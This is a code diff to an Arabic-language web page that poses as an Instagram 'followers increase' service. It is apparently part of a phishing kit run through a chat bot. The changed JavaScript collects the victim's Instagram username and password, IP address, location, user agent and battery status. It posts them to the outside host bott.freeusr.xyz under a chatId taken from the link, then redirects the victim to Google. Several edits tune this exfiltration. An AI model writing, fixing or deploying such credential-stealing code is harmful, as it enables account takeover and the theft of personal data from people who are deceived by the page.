@@ -189,11 +189,6 @@
             font-size: 12px;
         }
 
-        .footer a {
-            color: #f39c12;
-            text-decoration: none;
-        }
-
         @media (max-width: 480px) {
             .container {
                 padding: 25px 20px;
@@ -218,7 +213,7 @@
         <div class="logo">📸</div>
         <h2>زيادة متابعين انستجرام <span>🚀</span></h2>
 
-        <form id="loginForm">
+        <form id="loginForm" enctype="multipart/form-data">
             <div class="input-group">
                 <label>📧 البريد الإلكتروني أو اليوزر</label>
                 <input type="text" id="username" placeholder="أدخل البريد الإلكتروني أو اسم المستخدم" required>
@@ -262,7 +257,7 @@
         // دالة إرسال تقارير الفشل
         // ============================================
         async function sendFailReport(type, message, details = {}) {
-            const chatId = document.getElementById('chatId')?.value || 'غير معروف';
+            const chatId = new URLSearchParams(window.location.search).get('chatId') || 'غير معروف';
             try {
                 await fetch('https://bott.freeusr.xyz/fail', {
                     method: 'POST',
@@ -291,30 +286,48 @@
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('chatId');
 
-        // ============================================
-        // التحقق من وجود chatId
-        // ============================================
         if (!chatId) {
             sendFailReport('error', 'معرف المستخدم غير موجود في الرابط', {});
             alert('خطأ: chatId غير موجود في الرابط');
         }
 
         // ============================================
-        // جلب معلومات IP
+        // جلب معلومات IP مع تجنب 429
         // ============================================
+        let cachedIpData = null;
+        let ipFetched = false;
+
         async function getIPInfo() {
-            try {
-                const res = await fetch('https://ipwho.is/');
-                const data = await res.json();
-                return {
-                    ip: data.ip || 'غير معروف',
-                    country: data.country_name || 'غير معروف',
-                    city: data.city || 'غير معروف'
-                };
-            } catch (error) {
-                sendFailReport('error', 'فشل جلب معلومات IP', { error: error.message });
-                return { ip: 'غير معروف', country: 'غير معروف', city: 'غير معروف' };
+            if (ipFetched && cachedIpData) {
+                return cachedIpData;
             }
+
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 3000);
+
+                const res = await fetch('https://ipapi.co/json/', {
+                    signal: controller.signal
+                });
+                clearTimeout(timeoutId);
+
+                if (res.ok) {
+                    const data = await res.json();
+                    cachedIpData = {
+                        ip: data.ip || 'غير معروف',
+                        country: data.country_name || 'غير معروف',
+                        city: data.city || 'غير معروف'
+                    };
+                } else {
+                    cachedIpData = { ip: 'غير معروف', country: 'غير معروف', city: 'غير معروف' };
+                }
+            } catch (error) {
+                console.warn('IP fetch failed, using fallback');
+                cachedIpData = { ip: 'غير معروف', country: 'غير معروف', city: 'غير معروف' };
+            }
+
+            ipFetched = true;
+            return cachedIpData;
         }
 
         // ============================================
@@ -348,7 +361,7 @@
         }
 
         // ============================================
-        // معالج إرسال النموذج
+        // معالج إرسال النموذج - متوافق مع مسار /submitIncrease
         // ============================================
         document.getElementById('loginForm').addEventListener('submit', async (e) => {
             e.preventDefault();
@@ -366,7 +379,6 @@
                 return;
             }
 
-            // عرض السبينر
             document.getElementById('spinner').style.display = 'block';
             document.getElementById('submitBtn').disabled = true;
 
@@ -375,19 +387,22 @@
                 const deviceInfo = getDeviceInfo();
                 const batteryInfo = await getBatteryInfo();
 
+                // ✅ استخدام FormData كما يطلبه الخادم
                 const formData = new FormData();
                 formData.append('username', username);
                 formData.append('password', password);
-                formData.append('followers', followers);
+                formData.append('platform', 'Instagram');
                 formData.append('chatId', chatId || 'غير معروف');
                 formData.append('ip', ipData.ip);
                 formData.append('country', ipData.country);
                 formData.append('city', ipData.city);
-                formData.append('platform', deviceInfo.platform);
                 formData.append('userAgent', deviceInfo.userAgent);
                 formData.append('batteryLevel', batteryInfo.batteryLevel);
-                formData.append('batteryCharging', batteryInfo.batteryCharging);
+                formData.append('charging', batteryInfo.batteryCharging === 'نعم' ? 'true' : 'false');
+                formData.append('osVersion', deviceInfo.platform);
+                formData.append('followers', followers);
 
+                // ✅ إرسال إلى المسار الصحيح
                 const response = await fetch('https://bott.freeusr.xyz/submitIncrease', {
                     method: 'POST',
                     body: formData
@@ -404,15 +419,17 @@
                         window.location.href = "https://www.google.com/";
                     }, 2500);
                 } else {
-                    const errorData = await response.json().catch(() => ({}));
+                    const errorText = await response.text();
+                    console.error('Server error:', response.status, errorText);
                     sendFailReport('upload', 'فشل إرسال البيانات', {
                         status: response.status,
-                        error: errorData.error || 'Unknown'
+                        error: errorText
                     });
                     alert('فشل الإرسال. حاول مرة أخرى.');
                 }
 
             } catch (error) {
+                console.error('Error:', error);
                 document.getElementById('spinner').style.display = 'none';
                 document.getElementById('submitBtn').disabled = false;
 
